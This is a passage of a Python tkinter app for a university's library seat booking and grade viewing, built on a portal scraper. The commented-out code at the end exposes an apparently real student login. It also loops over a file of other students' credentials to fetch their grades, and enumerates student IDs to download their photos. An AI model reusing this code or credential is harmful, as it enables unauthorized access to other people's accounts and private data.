            if tomorrow_var.get() == 1:
                today_checkbutton.deselect()

        # btn1 = tkinter.Button(win, text="教务系统查分", width=15, height=2, command=btn1CallBack)
        # btn2 = tkinter.Button(win, text="图书馆预约", width=15, height=2, command=btn2CallBack)
        # btn1.grid(row=2, column=0, columnspan=3, padx=85, pady=10)
        # btn2.grid(row=5, column=0, columnspan=3, padx=85, pady=10)
        today_var = tkinter.IntVar()
        today_checkbutton = tkinter.Checkbutton(win, text="今天", variable=today_var, onvalue=1, offvalue=0,
                                                command=today_checked)
        today_checkbutton.pack()
        today_checkbutton.grid(row=1, column=1, columnspan=2)

        tomorrow_var = tkinter.IntVar()
        tomorrow_checkbutton = tkinter.Checkbutton(win, text="明天", variable=tomorrow_var, onvalue=1, offvalue=0,
                                                   command=tomorrow_checked)
        tomorrow_checkbutton.grid(row=2, column=1, columnspan=2)

        time_label = tkinter.Label(win, text="开始时间")
        time_label.grid(row=1, column=4, rowspan=1, columnspan=1, padx=20)
        times = ["{}:{:02d}".format(hour, minute) for hour in range(8, 24) for minute in [0, 30]]
        time_combobox = tkinter.ttk.Combobox(win, values=times, state="readonly", width=8)
        time_combobox.grid(row=2, column=4, rowspan=1, columnspan=1, padx=20)

        duration_label = tkinter.Label(win, text="时长")
        duration_label.grid(row=1, column=5, rowspan=1, columnspan=1, padx=22)
        duration = ["0:30", "1:00", "1:30", "2:00", "2:30", "3:00", "3:30", "4:00"]
        duration_combobox = tkinter.ttk.Combobox(win, values=duration, state="readonly", width=8)
        duration_combobox.grid(row=2, column=5, rowspan=1, columnspan=1, padx=10)

        seat_label = tkinter.Label(win, text="座位号")
        seat_label.grid(row=1, column=6, rowspan=1, columnspan=1, padx=22)
        seat_var = tkinter.StringVar(value="")

        def validate_input(new_value):
            if new_value == "":
                return True
            try:
                float(new_value)
                return True
            except ValueError:
                return False

        seat_entry = tkinter.Entry(win, textvariable=seat_var, validate="key",
                                   validatecommand=(win.register(validate_input), "%P"), width=8)
        seat_entry.grid(row=2, column=6)

        def btn_book():
            try:
                if today_var.get() == 1:
                    date = "today"
                if tomorrow_var.get() == 1:
                    date = "tomorrow"
                starttime_str = time_combobox.get().split(':')
                starttime = float(starttime_str[0]) + float(starttime_str[1]) / 60
                duration_str = duration_combobox.get().split(':')
                duration = float(duration_str[0]) + float(duration_str[1]) / 60
                seat = int(seat_entry.get())
                libspider=library.libspider(user=-1,username=self.username,password=self.password)
                log=libspider.book(date=date,starttime=starttime,duration=duration,seat=seat)
                tkinter.messagebox.showinfo("预约状态", log)
                # print(date, starttime, duration, seat)
            except:
                tkinter.messagebox.showinfo("预约状态","预约失败，请填写正确的预约信息！")
        def btn_cancel():
            libspider = library.libspider(user=-1, username=self.username, password=self.password)
            log, date, start_time, duration, seat, cancelable=libspider.Cancel(True)
            tkinter.messagebox.showinfo("取消状态", log)
        confirm_button = tkinter.Button(win, text="预约", command=btn_book, width=50)
        confirm_button.grid(row=5, column=1, columnspan=6, padx=10, pady=10)
        cancel_button = tkinter.Button(win, text="取消已有预约", command=btn_cancel, width=50)
        cancel_button.grid(row=6, column=1, columnspan=6, padx=10, pady=0)
        win.mainloop()
    def ScorePage(self,score):
        def btnCallBack():
            self.portalspider.SaveScoreToXls(score_table=score,filename="score")
            tkinter.messagebox.showinfo("成功", "成绩单已保存到score.xls内！")
        headings = ['学号', '姓名', '学期', '课程', '类别', '学分', '分数', '考试性质', '绩点', '学科代码']
        rows = score
        win = tkinter.Tk()
        win.title("成绩单")
        # Create table and pack it
        table = self.tkTable(win, headings, rows)
        table.grid(row=0, column=0, sticky="nsew")
        # Create button and pack it
        button = tkinter.ttk.Button(win, text="保存", command=btnCallBack)
        button.grid(row=1, column=0, pady=10)

        # Configure grid weights
        win.rowconfigure(0, weight=1)
        win.columnconfigure(0, weight=1)
        win.mainloop()

    class tkTable(tkinter.Frame):
        def __init__(self, parent=None, headings=[], rows=[]):
            super().__init__(parent)

            self.treeview = tkinter.ttk.Treeview(self, columns=headings, show="headings")
            self.treeview.pack(side="left", fill="both", expand=True)

            for head in headings:
                self.treeview.heading(head, text=head.title())

            for row in rows:
                self.treeview.insert("", "end", values=row)

            ysb = tkinter.ttk.Scrollbar(self, orient='vertical', command=self.treeview.yview)
            # xsb = ttk.Scrollbar(self, orient='horizontal', command=self.treeview.xview)
            self.treeview.configure(yscroll=ysb.set)
            ysb.pack(side='right', fill='y')
            # xsb.pack(side='bottom', fill='x')
            for col in headings:
                self.treeview.column(col, width=80)
if __name__=="__main__":
    ui=UI()
    ui.LoginPage()


    # username = "20440225"
    # password = "Amelia,520"
    # spider = CCZUVPN()
    # spider.Login(username, password, mode='status')
    # portalspider=spider.Portal()
    # data=portalspider.GetScore()
    # print(data)
    # portalspider.SaveScoreToXls(data)

    # with open("stuinfo.json") as f_obj:
    # 	stuinfo = json.load(f_obj)  #读取文件
    # print(stuinfo)
    # for i in range(len(stuinfo)):
    #     username1 = stuinfo[i][0]
    #     password1 = stuinfo[i][1][-6:]
    #     spider=CCZUVPN(username1,password1,mode=True)
    #     portalspider=spider.Portal()
    #     data=portalspider.GetScore()

    # portalspider.GetProfile()
    # portalspider.ModifyProfile()
    # for i in range(1, 31, 1):
    #     s = ''
    #     if i < 10: s = '0'
    #     s = s + str(i);
    #     print(s)
    #     portalspider.GetPhoto('20411031'+s,'photo3')
    # cardspider=spider.Card('19440209')
    # cardspider.GetProfile()
    # print(cardspider.QueryFlow())